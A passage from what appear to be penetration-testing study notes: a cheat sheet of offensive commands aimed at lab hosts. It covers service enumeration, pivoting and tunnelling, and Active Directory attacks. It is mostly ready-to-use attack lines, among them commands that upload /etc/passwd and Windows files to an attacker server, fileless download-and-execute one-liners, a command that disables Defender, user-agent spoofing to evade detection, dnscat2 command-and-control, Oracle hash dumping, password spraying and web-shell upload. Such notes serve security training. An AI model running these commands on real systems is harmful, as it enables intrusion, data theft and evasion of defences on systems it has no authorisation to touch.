smtp-user-enum -M VRFY -U users.txt -t 10.129.6.156 -w 30
```

---

## Snmpwalk

```bash
snmpwalk -v2c -c public 10.129.14.128
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
snmpwalk -v 2c -c backup 10.129.19.54
snmpget -v2c -c backup 10.129.19.54 1.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4
snmp-check -c backup 10.129.19.54
```

---

## Socat

Reverse shell redirect (pivot Ubuntu → attacker):
```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Bind shell redirect (pivot Ubuntu → internal Windows):
```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

---

## SQLplus (Oracle)

Install:
```bash
sudo apt install oracle-instantclient-sqlplus
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"; sudo ldconfig
sqlplus -v
```

Connect:
```bash
sqlplus scott/tiger@10.129.204.235/XE
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

Oracle commands:
```oracle
select table_name from all_tables;
select * from user_role_privs;
select name, password from sys.user$;
```

---

## SSH

Connect:
```bash
ssh user@server
chmod 600 id_rsa && ssh -i id_rsa user@server
```

Brute force / analysis:
```bash
ssh -v cry0l1t3@10.129.14.132
ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
```

Generate keys:
```bash
ssh-keygen -f key
echo "ssh-rsa AAAA...= user@parrot" >> /root/.ssh/authorized_keys
ssh root@10.10.10.10 -i key
```

### Kerberos SSH

Edit `/etc/krb5.conf`:
```
[libdefaults]
    default_realm = REALCORP.HTB
[realms]
    REALCORP.HTB = { kdc = srv01.realcorp.htb }
[domain_realm]
    .REALCORP.HTB = REALCORP.HTB
```

```bash
sudo kdestroy
sudo kinit <username>
sudo klist
sudo ssh -o GSSAPIAuthentication=yes j.nakazawa@10.10.10.224
```

### SSH Port Forwarding

Local:
```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

Dynamic SOCKS:
```bash
ssh -D 9050 ubuntu@10.129.202.64
```

Remote/Reverse:
```bash
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

### SCP

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
scp plaintext@192.168.49.128:/root/myroot.txt .
```

---

## Sshuttle

```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
```

---

## Subfinder

```bash
subfinder -d inlanefreight.com
```

---

## Wafw00f

```bash
wafw00f inlanefreight.com
```

---

## Whatweb

```bash
whatweb --no-errors 10.10.10.0/24
```

---

## Wireshark & Tcpdump

```bash
sudo -E wireshark
sudo tcpdump -i ens224
```

---

## File Transfer Methods

### Python HTTP Server

```bash
python3 -m http.server 80
python2.7 -m SimpleHTTPServer
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```

Download on victim:
```bash
wget http://x/linenum.sh
curl http://x/linenum.sh -o linenum.sh
```

### Upload Server (uploadserver)

```bash
pip3 install uploadserver
python3 -m uploadserver
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Upload from victim (PowerShell PSUpload.ps1):
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

Upload from victim (Linux):
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' --insecure
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

### Nginx PUT Upload (receive files over HTTP)

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

Nginx config (`/etc/nginx/sites-available/upload.conf`):
```nginx
server {
    listen 9001;
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx.service
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

### PowerShell Downloads

```powershell
(New-Object Net.WebClient).DownloadFile('https://url/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
IEX (New-Object Net.WebClient).DownloadString('https://url/Invoke-Mimikatz.ps1')
Invoke-WebRequest https://url -OutFile PowerView.ps1
Invoke-WebRequest https://url -UseBasicParsing | IEX
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}   # bypass SSL
```

### Changing User Agent (Evade Detection)

Some defenders block default PowerShell User-Agents. Spoof with a browser UA:
```powershell
$h = New-Object System.Net.WebClient
$h.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36")
$h.DownloadString("http://10.10.14.17/file.ps1")
```

Invoke-WebRequest with custom UA:
```powershell
Invoke-WebRequest http://10.10.14.17/file.ps1 -UseBasicParsing -UserAgent "Mozilla/5.0 ..."
```

### Base64 (bypass firewall)

Linux → Victim:
```bash
cat id_rsa | base64 -w 0; echo
# On victim:
echo -n 'BASE64' | base64 -d > id_rsa
```

Windows → Attacker:
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
# On Linux:
echo BASE64 | base64 -d > hosts
```

PowerShell decode:
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("BASE64STRING"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

### SMB

```bash
# Attacker server
sudo impacket-smbserver share -smb2support /tmp/smbshare
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```powershell
# Windows victim
copy \\192.168.220.133\share\nc.exe
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
copy C:\Users\john\Desktop\file.zip \\192.168.49.129\DavWWWRoot\
```

### FTP

```bash
# Attacker server
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
# Victim
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### Linux Direct Downloads

```bash
wget https://url/LinEnum.sh -O /tmp/LinEnum.sh
curl -o /tmp/LinEnum.sh https://url/LinEnum.sh
curl https://url/LinEnum.sh | bash   # fileless
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```

### WebDAV (SMB upload over HTTP)

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```powershell
dir \\192.168.49.128\DavWWWRoot
copy C:\Users\john\Desktop\file.zip \\192.168.49.129\DavWWWRoot\
```

### Encrypted Transfers

Windows:
```powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```

Linux:
```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

### Multi-Language Downloads

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://url/LinEnum.sh", "LinEnum.sh")'
php -r '$file = file_get_contents("https://url/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://url/LinEnum.sh")))'
perl -e 'use LWP::Simple; getstore("https://url/LinEnum.sh", "LinEnum.sh");'
```

### LOLBins for File Transfer (Windows)

```powershell
# GfxDownloadWrapper (Intel driver LOLBIN)
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

More LOLBins: https://lolbas-project.github.io/#/download

---

## Windows Port Forwarding

### Netsh
```powershell
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
netsh.exe interface portproxy show v4tov4
xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
```

### Plink.exe (PuTTY)
```bash
plink -ssh -D 9050 ubuntu@10.129.15.50
```

We have [Proxifier](https://www.proxifier.com) tool to create a tunneled network through SOCKS or HTTPS proxy.

![Pasted image 20260716190120](images/Pasted%20image%2020260716190120.png)

You can configure the SOCKS server with 127.0.0.1 and port 9050. Then, you can directly start`mstsc.exe` to start an RDP session with a Windows target that allows RDP connections.

### Rpivot
```bash
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
python2 client.py --server-ip 10.10.14.18 --server-port 9999
proxychains firefox-esr 172.16.5.135:80
```

With NTLM proxy:
```bash
python client.py --server-ip <IP> --server-port 8080 --ntlm-proxy-ip <ProxyIP> --ntlm-proxy-port 8081 --domain <domain> --username <user> --password <pass>
```

### DNScat2
```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

PowerShell (victim):
```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

### Ptunnel-ng (ICMP tunneling)
```bash
# Pivot host
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Attacker
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
ssh -p2222 -lubuntu 127.0.0.1
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

### SocksOverRDP
```cmd
regsvr32.exe SocksOverRDP-Plugin.dll
netstat -antb | findstr 1080
```

---

## System Commands

### Windows
```cmd
dir -Force                                                   # hidden files
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   # autologin
netstat -r                                                   # routing table
net accounts                                                  # password policy
net use \\DC01\ipc$ "" /u:""                                  # null session
```

PowerShell security:
```powershell
Get-MpComputerStatus                                         # Windows Defender status
Set-MpPreference -DisableRealtimeMonitoring $true            # disable Defender
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$ExecutionContext.SessionState.LanguageMode                   # language mode
Import-Module .\PowerView.ps1; Get-DomainPolicy
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

### Linux
```bash
find / -perm -4000 -type f 2>/dev/null    # SUID binaries
sudo -l                                    # sudo privileges
getcap -r / 2>/dev/null                   # capabilities
sudo --version                            # sudo version (search for exploits)
dpkg -l                                   # installed software
```

### Important Paths

| System | Path |
|--------|------|
| Windows hosts | `C:\Windows\System32\drivers\etc\hosts` |
| Windows web IIS | `C:\inetpub\wwwroot` |
| Windows temp | `C:\Windows\Temp` |
| Linux web | `/var/www/html` |
| Linux cron | `/etc/crontab`, `/etc/cron.d` |
| Linux SSH keys | `/home/user/.ssh/id_rsa`, `/root/.ssh/id_rsa` |

---

## NFS

TCP/UDP ports 111 and 2049.

```bash
showmount -e 10.129.14.128                                  # list NFS mounts

mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock   # mount NFS share
ls -l mnt/nfs/                                              # list with names
ls -n mnt/nfs/                                              # list with UIDs/GIDs

sudo umount ./target-NFS                                     # unmount
```

---

## SMTP / IMAP / POP3

**SMTP** — ports 25, 587, 465.

```bash
telnet 10.129.14.128 25
EHLO inlanefreight.htb
VRFY root                                                    # verify user
MAIL FROM: attacker@domain.com
RCPT TO: victim@domain.com NOTIFY=success,failure
DATA
.
QUIT

smtp-user-enum -M VRFY -U users.txt -t 10.129.6.156        # enumerate users
smtp-user-enum -M VRFY -U users.txt -t 10.129.6.156 -w 30  # with extended timeout

sudo nmap 10.129.14.128 -sC -sV -p25                        # nmap scripts
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v    # detect open relay

# Proxy via CONNECT:
CONNECT 10.129.14.128:25 HTTP/1.0
```

**IMAP** — ports 143, 993 (TLS).

```bash
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd        # list mailboxes
openssl s_client -connect 10.129.14.128:imaps               # TLS connection

# IMAP commands:
1 LOGIN username password
1 LIST "" *
1 SELECT INBOX
1 FETCH <ID> all
1 FETCH <ID> BODY[]
1 LOGOUT
```

**POP3** — ports 110, 995 (TLS).

```bash
openssl s_client -connect 10.129.14.128:pop3s               # TLS connection

# POP3 commands:
USER username
PASS password
STAT
LIST
RETR id
DELE id
QUIT
```

---

## MySQL (Advanced)

Port 3306.

```bash
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*      # nmap scripts
mysql -u root -h 10.129.14.132                              # no password
mysql -u root -pP4SSw0rd -h 10.129.14.12                   # with password
```

Useful SQL commands:
```sql
show databases;
use <database>;
show tables;
show columns from <table>;
select * from <table>;
select * from <table> where <column> = "string";

-- sys schema
use sys;
select host, unique_users from host_summary;    -- view connections (lateral movement)
```

---

## MSSQL

Ports 1433 and 1434.

```bash
# Nmap scripts:
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER \
  -sV -p 1433 10.129.201.248

# Metasploit:
use auxiliary/scanner/mssql/mssql_ping
set rhosts 10.129.201.248
run

# Impacket mssqlclient:
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
help    # view available commands
```

---

## IPMI

UDP port 623. BMC (Baseboard Management Controllers).

```bash
sudo nmap -sU --script ipmi-version -p 623 10.129.42.195

# Metasploit:
use auxiliary/scanner/ipmi/ipmi_version
set rhosts 10.129.42.195
run

use auxiliary/scanner/ipmi/ipmi_dumphashes    # get hashes
set rhosts 10.129.42.195
run

# Crack hash (mode 7300):
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

Default passwords:
| Vendor | Username | Password |
|--------|----------|----------|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | random 8-char string |
| Supermicro | ADMIN | ADMIN |

---

## R-services (rlogin / rwho / rusers)

Ports 512, 513, 514.

```bash
rlogin 10.0.17.2 -l htb-student    # remote login
rwho                               # view interactive sessions on network
rusers -al 10.0.17.5               # list authenticated users
```

---

## WMI / wmiexec

```bash
wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

Non-interactive shell — each command spawns a cmd.exe process.

---

## Rubeus

Upload binary to victim host.

```bash
Rubeus.exe asreproast /user:user /domain:domain.local /dc:<hostname>
Rubeus.exe kerberoast /creduser:s4vicorp.local\user /credpassword:password
```

---

## PowerView

Part of the deprecated [PowerSploit](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) toolkit, maintained in Empire 4.

Import:
```powershell
Import-Module .\PowerView.ps1
```

| Command | Description |
| :--- | :--- |
| **General** | |
| `Export-PowerViewCSV` | Append results to a CSV file |
| `ConvertTo-SID` | Convert a user or group name to its SID value |
| `Get-DomainSPNTicket` | Request Kerberos ticket for a specified SPN account |
| **Domain / LDAP** | |
| `Get-Domain` | Returns the AD object for the current (or specified) domain |
| `Get-DomainController` | Returns a list of Domain Controllers |
| `Get-DomainUser` | Returns all users or specific user objects in AD |
| `Get-DomainComputer` | Returns all computers or specific computer objects |
| `Get-DomainGroup` | Returns all groups or specific group objects |
| `Get-DomainOU` | Searches for all or specific OU objects |
| `Find-InterestingDomainAcl` | Finds object ACLs with modification rights set to non-built-in objects |
| `Get-DomainGroupMember` | Returns the members of a specific domain group |
| `Get-DomainFileServer` | Returns a list of servers likely functioning as file servers |
| `Get-DomainDFSShare` | Returns all distributed file systems for the domain |
| **GPO** | |
| `Get-DomainGPO` | Returns all GPOs or specific GPO objects |
| `Get-DomainPolicy` | Returns the default domain policy or DC policy |
| **Computer Enumeration** | |
| `Get-NetLocalGroup` | Enumerates local groups on the local or a remote machine |
| `Get-NetLocalGroupMember` | Enumerates members of a specific local group |
| `Get-NetShare` | Returns open shares on the local (or a remote) machine |
| `Get-NetSession` | Returns session information for the local (or a remote) machine |
| `Test-AdminAccess` | Tests if the current user has administrative access |
| **Threaded Meta-Functions** | |
| `Find-DomainUserLocation` | Finds machines where specific users are logged in |
| `Find-DomainShare` | Finds reachable shares on domain machines |
| `Find-InterestingDomainShareFile` | Searches for files matching specific criteria on readable shares |
| `Find-LocalAdminAccess` | Finds machines where the current user has local admin access |
| **Domain Trust** | |
| `Get-DomainTrust` | Returns domain trusts for the current domain |
| `Get-ForestTrust` | Returns all forest trusts for the current forest |
| `Get-DomainForeignUser` | Enumerates users who are in groups outside of the user's domain |
| `Get-DomainForeignGroupMember` | Enumerates groups with users outside of the group's domain |
| `Get-DomainTrustMapping` | Enumerates all trusts for the current domain and any discovered |

Common usage:
```powershell
# Specific user details
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Enumerate group members (with nested groups)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Domain trust mapping
Get-DomainTrustMapping

# Test local admin access on a host
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

# Accounts with SPN (Kerberoasting candidates)
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

---

## SharpView

.NET version of PowerView.

```powershell
.\SharpView.exe Get-DomainUser -Help
.\SharpView.exe Get-DomainUser -Identity forend
```

---

## Windapsearch

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u "" -U            # anonymous users
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da   # domain admins
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU   # privileged users
```

---

## DomainPasswordSpray

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

---

## LAPSToolkit

```powershell
Import-Module .\LAPSToolkit.ps1
Find-LAPSDelegatedGroups          # groups delegated to read LAPS passwords
Find-AdmPwdExtendedRights         # users with "All Extended Rights"
Get-LAPSComputers                 # computers with LAPS + cleartext passwords
```

---

## DNScat2

DNS tunneling — exfiltration and C2 over DNS.

```bash
# Server (attacker):
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

# PowerShell client (victim):
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <secret> -Exec cmd

# On server:
?              # help
window -i 1   # get session
```

---

## ptunnel-ng (ICMP Tunneling)

```bash
# Pivot host (server):
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Attacker (client):
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
ssh -p2222 -lubuntu 127.0.0.1
ssh -D 9050 -p2222 -lubuntu 127.0.0.1   # with dynamic forwarding
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

---

## SocksOverRDP

```cmd
regsvr32.exe SocksOverRDP-Plugin.dll              # load plugin on pivot (via mstsc.exe)
# Connect to internal machine with mstsc.exe — plugin listens on 127.0.0.1:1080
# Transfer SocksOverRDP-Server.exe and run as admin

netstat -antb | findstr 1080                      # verify listener
# Configure Proxifier: Profile > Proxy Servers > 127.0.0.1:1080 SOCKS5
```

---

## Nessus

```bash
# Start services and access via web browser (default HTTPS port 8834)
# Web login > New Scan > select type > configure targets > launch
```

---

## OpenVAS / GVM

```bash
sudo apt-get install gvm && openvas
gvm-setup
gvm-start

# Generate report:
python3 -m openvasreporting -i report-<id>.xml -f xlsx
```

---

## ActiveDirectory PowerShell Module

Group of PowerShell cmdlets for administering AD environments from the command line.

```powershell
# Discover available modules
Get-Module

# Import if not loaded
Import-Module ActiveDirectory
Get-Module
```

```powershell
# Domain basic info (SID, functional level, child domains...)
Get-ADDomain

# Accounts with ServicePrincipalName set (Kerberoasting candidates)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Domain trust relationships
Get-ADTrust -Filter *

# Group enumeration
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"

# Group members
Get-ADGroupMember -Identity "Backup Operators"
```

---

## Snaffler

Acquires credentials or sensitive data from AD environments. Obtains a list of hosts and enumerates shares and readable directories. **Must be run from a domain-joined host.**

```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
```

Flags:
- `-s`: print results to the console
- `-d`: domain to search within
- `-o`: output log file
- `-v data`: verbose level showing only file results

---
---

# PART 2 — TECHNIQUES AND PROCEDURES

## Techniques Index

- [Passive Reconnaissance](#passive-reconnaissance)
- [Active Reconnaissance](#active-reconnaissance)
- [Service Enumeration](#service-enumeration)
- [LLMNR / NBT-NS Poisoning](#llmnr--nbt-ns-poisoning)
- [SAMBA Relay](#samba-relay)
- [NTLM Relay](#ntlm-relay)
- [AS-REP Roasting](#as-rep-roasting)
- [Kerberoasting](#kerberoasting)
- [Golden Ticket Attack](#golden-ticket-attack)
- [DCSync](#dcsync)
- [SCF Files (SMB Hash Capture)](#scf-files-smb-hash-capture)
- [Abusing GPP Passwords](#abusing-gpp-passwords)
- [Password Spraying](#password-spraying)
- [Windows Privilege Escalation](#windows-privilege-escalation)
- [Linux Privilege Escalation](#linux-privilege-escalation)
- [Pivoting - Strategy](#pivoting---strategy)
- [Active Directory Enumeration](#active-directory-enumeration)
- [Enumerating Password Policy](#enumerating-password-policy)
- [Enumerating Domain Users](#enumerating-domain-users)
- [Web Enumeration](#web-enumeration)
- [Squid Proxy](#squid-proxy)
- [Virtual Hosting](#virtual-hosting)
- [Common Scenarios](#common-scenarios)
- [Pentest Guidelines](#pentest-guidelines)
- [Security Controls Enumeration](#security-controls-enumeration)
- [Credentialed Enumeration](#credentialed-enumeration)
- [Living Off the Land](#living-off-the-land)

---

## Passive Reconnaissance

### What to Look For

| Category | What to Obtain |
|----------|----------------|
| IP Space | ASN, public infrastructure netblocks |
| Domain Information | Subdomains, mail servers, DNS, VPN, defense type (SIEM, AV, IPS/IDS) |
| Schema Format | Email format, AD usernames, password policies |
| Data Disclosures | Public files (.pdf, .ppt, .docx) with metadata, GitHub, S3 buckets |
| Breach Data | Usernames/passwords from breaches (HaveIBeenPwned, Dehashed) |

### Resources

- IP/ASN: [BGP Toolkit](https://bgp.he.net/), [ARIN](https://www.arin.net/), [RIPE](https://www.ripe.net/)
- Domain: [Domaintools](https://www.domaintools.com/), [PTRArchive](http://ptrarchive.com/), [ICANN](https://lookup.icann.org/lookup), [viewdns.info](https://viewdns.info/)
- Breaches: [HaveIBeenPwned](https://haveibeenpwned.com/), [Dehashed](https://www.dehashed.com/)
- Subdomains: [crt.sh](https://crt.sh/), [shodan.io](https://shodan.io)
- Cloud: [grayhatwarfare](https://buckets.grayhatwarfare.com/)
- Code: [Trufflehog](https://github.com/trufflesecurity/truffleHog)

### Google Dorks

```
filetype:pdf inurl:inlanefreight.com
intext:"@inlanefreight.com" inurl:inlanefreight
site:example.com inurl:login
site:example.com (inurl:login OR inurl:admin)
site:example.com filetype:pdf
site:example.com inurl:config.php
site:example.com filetype:sql
intext:domain.com inurl:amazonaws.com
intext:domain.com inurl:blob.core.windows.net
```

### Enumerate Subdomains

> Always enumerate at multiple levels: if you find `test.inlanefreight.htb`, `dev.test.inlanefreight.htb` may also exist.

```bash
# crt.sh (certificate transparency)
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u

# Filter company IPs (not third-party)
for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done

# Shodan with found IPs
for i in $(cat ip-addresses.txt);do shodan host $i;done
```

### Username Harvesting

- LinkedIn → [linkedin2username](https://github.com/initstring/linkedin2username)
- Statistical lists: [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) (`jsmith.txt`, `jsmith2.txt`)
- Breach credentials: [Dehashed](http://dehashed.com/)

---

## Active Reconnaissance

### First Look at a Host

1. Ping to confirm it's alive: `ping -c 1 <IP>`
2. Fast TCP SYN scan: `sudo nmap -p- --open -sS -T4 --min-rate 4500 -vvv -n -Pn -oG allPorts`
3. Scripts + versions on open ports: `sudo nmap -p<ports> -sCV -oN targeted`
4. UDP if nothing interesting on TCP: `sudo nmap -sU -T5 -Pn -n -F <IP>`

### DNS Records

```bash
dig any inlanefreight.com    # all records
nslookup ns1.inlanefreight.com
```

### Identify OS Codename from Service Version

If SSH returns `1:7.3p1-1ubuntu0.1`, search Google for `"1:7.3p1-1ubuntu0.1 codename"` to identify the exact Ubuntu version.

### Reconnaissance Frameworks

- [FinalRecon](https://github.com/thewhiteh4t/FinalRecon): `./finalrecon.py --headers --whois --url http://inlanefreight.com`
- [Recon-ng](https://github.com/lanmaster53/recon-ng)
- [theHarvester](https://github.com/laramies/theHarvester)
- [SpiderFoot](https://github.com/smicallef/spiderfoot)
- [OSINT Framework](https://osintframework.com/)

---

## Service Enumeration

### FTP (port 21)

1. Check if it allows anonymous login (`nmap -sCV` detects it automatically)
2. If anonymous is allowed, list and download everything: `wget -m --no-passive ftp://anonymous:anonymous@<IP>`
3. Check TLS: `openssl s_client -connect <IP>:21 -starttls ftp` — certificate may reveal hostname and email

FTP commands: `ls -la` (hidden), `ls -R` (recursive), `get file`, `prompt; mget *`

### SSH (port 22)

1. Check the banner (protocol and version)
2. Check for known CVEs:
   - OpenSSH 7.2p1 → command injection
   - CVE-2020-14145 (5.7-8.4) → Man-in-the-Middle on initial connection
3. Brute force if appropriate: `hydra -l user -P rockyou.txt ssh://<IP>`

### DNS (port 53)

1. Query records: `dig any domain.htb @<IP>`
2. Attempt zone transfer: `dig axfr domain.htb @<IP>` — if it works, reveals full infrastructure
3. Subdomain brute force: dnsenum, subfinder, amass

### SMB (port 445)

1. `nmap --script smb-os-discovery.nse` — OS version
2. `smbclient -L <IP> -N` — null session (list shares without credentials)
3. `smbmap -H <IP>` — view permissions
4. `crackmapexec smb <IP>` — basic info
5. With credentials: `crackmapexec smb <IP> -u user -p pass --shares`
6. Check EternalBlue: `nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010`

### RPC (port 445)

1. Attempt anonymous connection: `rpcclient -U "" <IP> -N`
2. Enumerate users: `enumdomusers`
3. Enumerate groups: `enumdomgroups`
4. Get user descriptions (may contain passwords): `querydispinfo`
5. Alternatively: `enum4linux-ng <IP>`

### LDAP (port 389)

1. Get naming contexts: `ldapsearch -x -H ldap://<IP> -s base namingcontexts`
2. If anonymous bind is enabled: `ldapsearch -x -H ldap://<IP> -b 'DC=...,DC=LOCAL'`
3. With valid credentials: `ldapdomaindump`

### Kerberos (port 88)

1. If port 88 is open, enumerate valid users with Kerbrute (doesn't generate failed authentication logs)
2. Check AS-REP Roasting: `impacket-GetNPUsers domain.htb/ -no-pass -usersfile users.txt`
3. With credentials, check Kerberoasting: `impacket-GetUserSPNs domain.htb/user:pass`

### NFS (ports 111 and 2049)

1. View mounts: `showmount -e <IP>`
2. Mount: `sudo mount -t nfs <IP>:/ ./target-NFS/ -o nolock`
3. View real permissions (UID): `ls -n mnt/nfs/`
4. If `root_squash` is not active: possible escalation via SUID

### SMTP (ports 25, 587, 465)

1. Banner grabbing: `nc -nv <IP> 25`
2. Enumerate users with VRFY: `smtp-user-enum -M VRFY -U users.txt -t <IP>`
3. Open relay: `nmap -p25 --script smtp-open-relay -v`
4. Interact manually: `telnet <IP> 25` → `EHLO`, `VRFY root`, `MAIL FROM:`...

### SNMP (UDP ports 161 and 162)

1. Brute force community strings: `onesixtyone -c dict.txt <IP>`
2. With known community string: `snmpwalk -v2c -c public <IP>`
3. Specific OID → convert `iso.X.Y.Z` to `1.X.Y.Z` and use `snmpget`

### MySQL (port 3306)

1. Attempt connection without password: `mysql -u root -h <IP>`
2. Nmap scripts: `nmap -sV -sC -p3306 --script mysql*`
3. View system connections (lateral movement): `use sys; select host, unique_users from host_summary;`

### MSSQL (port 1433)

1. Nmap scripts: `nmap --script ms-sql-* ...`
2. Metasploit module: `mssql_ping`
3. Connect: `python3 mssqlclient.py Administrator@<IP> -windows-auth`

### Oracle TNS (port 1521)

1. SID brute force: `nmap -p1521 --script oracle-sid-brute` or `odat.py all -s <IP>`
2. Connect with found SID: `sqlplus user/pass@<IP>/XE`
3. If sysdba → extract password hashes: `select name, password from sys.user$;`
4. Upload web shell: `odat.py utlfile ... --putFile`

### IPMI (UDP port 623)

1. `nmap -sU --script ipmi-version -p 623`
